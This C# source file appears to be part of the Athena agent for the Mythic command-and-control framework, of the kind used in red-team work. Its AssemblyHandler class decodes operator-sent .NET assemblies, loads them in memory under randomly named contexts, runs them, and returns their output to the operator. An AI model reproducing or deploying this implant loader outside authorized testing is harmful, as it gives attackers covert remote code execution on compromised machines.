using Athena.Models.Assembly;
using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using System.Collections.Concurrent;
using System.Reflection;
using System.Runtime.Loader;
using Athena.Models;
using System.Text.Json;
using Athena.Commands.Models;
using Athena.Models.Responses;
using Athena.Models.Assembly;

namespace Athena.Commands
{
    public class AssemblyHandler
    {
        private AssemblyLoadContext commandContext { get; set; }
        private ExecuteAssemblyContext executeAssemblyContext { get; set; }
        private ConcurrentDictionary<string, IPlugin> loadedPlugins { get; set; }
        public AssemblyHandler()
        {
            this.commandContext = new AssemblyLoadContext(Misc.RandomString(Misc.GenerateSmallerRandomNumber()));
            this.executeAssemblyContext = new ExecuteAssemblyContext(Misc.RandomString(Misc.GenerateSmallerRandomNumber()));
            this.loadedPlugins = new ConcurrentDictionary<string, IPlugin>();
        }
        /// <summary>
        /// See if a requested plugin already exists, and can be loaded internally
        /// </summary>
        /// <param name="name">The name of the plugin to load</param>
        private async Task<bool> TryLoadAssembly(string name)
        {
            try
            {
                Assembly _tasksAsm = Assembly.Load($"{name}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");

                foreach (Type t in _tasksAsm.GetTypes())
                {
                    if (typeof(IPlugin).IsAssignableFrom(t))
                    {
                        IPlugin plug = (IPlugin)Activator.CreateInstance(t);
                        loadedPlugins.GetOrAdd(name, plug);
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }
            return false;
        }
        /// <summary>
        /// Load an assembly into our execution context
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<string> LoadAssemblyAsync(MythicJob job)
        {
            //This will load an assembly into our Assembly Load Context for usage with.
            //This can also be used to help fix resolving issues when loading assemblies in trimmed executables.
            LoadAssembly la = JsonSerializer.Deserialize(job.task.parameters, LoadAssemblyJsonContext.Default.LoadAssembly);

            try
            {
                switch (la.target.ToHash())
                {
                    case "A24BCF2198B1B13AD985304483F7F324":
                        this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.asm)));
                        break;
                    case "6A21B6995A068148BBB65C8F949B3FB2":
                        this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.asm)));
                        break;
                    default:
                        return new ResponseResult
                        {
                            task_id = job.task.id,
                            process_response = new Dictionary<string, string> { { "message", "0x18" } },
                            completed = true,
                            status = "error"
                        }.ToJson();

                }

                //Return true if success
                return new ResponseResult
                {
                    task_id = job.task.id,
                    process_response = new Dictionary<string, string> { { "message", "0x19" } },
                    completed = true
                }.ToJson();

            }
            catch (Exception e)
            {
                return new ResponseResult
                {
                    task_id = job.task.id,
                    user_output = e.Message,
                    completed = true,
                    status = "error"
                }.ToJson();
            }
        }
        /// <summary>
        /// Execute an operator provided assembly with arguments
        /// </summary>
        /// <param name="job">MythicJob containing the assembly with arguments</param>
        public async Task<string> ExecuteAssembly(MythicJob job) //How do I deal with this now?
        {
            //Check if we can capture StdOut
            if (PluginHandler.StdIsBusy())
            {
                return new ResponseResult()
                {
                    completed = true,
                    process_response = new Dictionary<string, string> { { "message", "0x20" } },
                    task_id = job.task.id,
                }.ToJson();
            }

            ExecuteAssemblyTask ea = JsonSerializer.Deserialize(job.task.parameters, ExecuteAssemblyTaskJsonContext.Default.ExecuteAssemblyTask);

            if (!PluginHandler.CaptureStdOut(job.task.id))
            {
                return new ResponseResult()
                {
                    completed = true,
                    process_response = new Dictionary<string, string> { { "message", "0x1A" } },
                    task_id = job.task.id,
                }.ToJson();
            }

            try
            {
                //Load the assembly
                var assembly = this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(ea.asm)));

                //Invoke the Assembly
                assembly.EntryPoint.Invoke(null, new object[] { await Misc.SplitCommandLine(ea.arguments) }); //I believe this blocks until it's finished
            }
            catch (BadImageFormatException be)
            {
                PluginHandler.ReleaseStdOut();
                return new ResponseResult
                {
                    completed = true,
                    user_output = string.Empty,
                    task_id = job.task.id,
                    process_response = new Dictionary<string, string>() { { "message", "0x43" } },
                    status = "error"
                }.ToJson();
            }
            catch (Exception e)
            {
                PluginHandler.ReleaseStdOut();
                return new ResponseResult
                {
                    completed = true,
                    user_output = this.GetAssemblyOutput() + Environment.NewLine + e + Environment.NewLine + e.ToString(),
                    task_id = job.task.id,
                    status = "error"
                }.ToJson();
            }

            PluginHandler.ReleaseStdOut();
            return await this.GetAssemblyOutput();
        }
        /// <summary>
        /// Get output from the currently running assembly
        /// </summary>
        public async Task<string> GetAssemblyOutput()
        {
            return new ResponseResult
            {
                user_output = await PluginHandler.GetStdOut(),
                task_id = PluginHandler.StdOwner(),
                completed = (!PluginHandler.StdIsBusy())
            }.ToJson();
        }
        /// <summary>
        /// Clear the execution context of any loaded assemblies
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<string> ClearAssemblyLoadContext(MythicJob job)
        {
            //This will clear out the assembly load context for the Athena agent in order to leave it fresh for future use.
            //This will help scenarios where you have a library loaded with a specific version, but need to load that library again for a different one
            try
            {
                this.executeAssemblyContext.Unload();
                this.executeAssemblyContext = new ExecuteAssemblyContext(Misc.RandomString(Misc.GenerateSmallerRandomNumber()));
                return new ResponseResult
                {
                    task_id = job.task.id,
                    completed = true,
                    process_response = new Dictionary<string, string> { { "message", "0x1B" } },
                }.ToJson();
            }
            catch (Exception e)
            {
                return new ResponseResult
                {
                    task_id = job.task.id,
                    completed = true,
                    user_output = e.Message,
                    status = "error"
                }.ToJson();
            }
        }
           
        public async Task<string> LoadCommandAsync(string task_id, string command, byte[] buf)
        {
            if (this.loadedPlugins.ContainsKey(task_id))
            {
                return new LoadCommandResponseResult
                {
                    completed = true,
                    process_response = new Dictionary<string, string> { { "message", "0x1C" } },
                    task_id = task_id,
                    status = "error"
                }.ToJson();
            }

            try
            {
                var loadedAssembly = this.commandContext.LoadFromStream(new MemoryStream(buf));
                foreach (Type t in loadedAssembly.GetTypes())
                {
                    if (typeof(IPlugin).IsAssignableFrom(t))
                    {
                        IPlugin plug = (IPlugin)Activator.CreateInstance(t);
                        this.loadedPlugins.GetOrAdd(plug.Name, plug);

                        return new LoadCommandResponseResult()
                        {
                            completed = true,
                            process_response = new Dictionary<string, string> { { "message", "0x1D" } },
                            task_id = task_id,
                            commands = new List<CommandsResponse>()
                                {
                                    new CommandsResponse()
                                    {
                                        action = "add",
                                        cmd = plug.Name,
                                    }
                                }
                        }.ToJson();
                    }
                }

                return new LoadCommandResponseResult()
                {
                    completed = true,
                    process_response = new Dictionary<string, string> { { "message", "0x1E" } },
                    task_id = task_id,
                    status = "error",
                    commands = new List<CommandsResponse>(),
                }.ToJson();
            }
            catch (Exception e)
            {
                return new LoadCommandResponseResult()
                {
                    completed = true,
                    user_output = e.Message,
                    task_id = task_id,
                    status = "error",
                    commands = new List<CommandsResponse>(),
                }.ToJson();

            }
        }

        public async Task<string> UnloadCommands(MythicJob job)
        {
            List<CommandsResponse> unloaded = new List<CommandsResponse>();

            return new LoadCommandResponseResult()
            {
                completed = true,
                process_response = new Dictionary<string, string> { { "message", "0x1F" } },
                task_id = job.task.id,
                commands = unloaded,
            }.ToJson();

        }

        /// <summary>
        /// Run a previously loaded command
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<ResponseResult> RunLoadedCommand(MythicJob job)
        {
            try
            {
                Dictionary<string, string> parameters = new Dictionary<string, string>();
                if (!String.IsNullOrEmpty(job.task.parameters))
                {
                    parameters = Misc.ConvertJsonStringToDict(job.task.parameters);
                }
                parameters.Add("task-id", job.task.id);
                this.loadedPlugins[job.task.command].Execute(parameters);
                return null;
            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    user_output = e.ToString() + Environment.NewLine + e.InnerException + Environment.NewLine + e.StackTrace,
                    completed = true,
                    status = "error",
                    task_id = job.task.id,
                };
            }
        }
        /// <summary>
        /// Check to see if a command is already loaded
        /// </summary>
        /// <param name="command">Event Sender</param>
        public async Task<bool> IsCommandLoaded(string command)
        {
            if (this.loadedPlugins.ContainsKey(command))
            {
                return true;
            }
            else
            {
                return await this.TryLoadAssembly(command);
            }
        }
    }
}
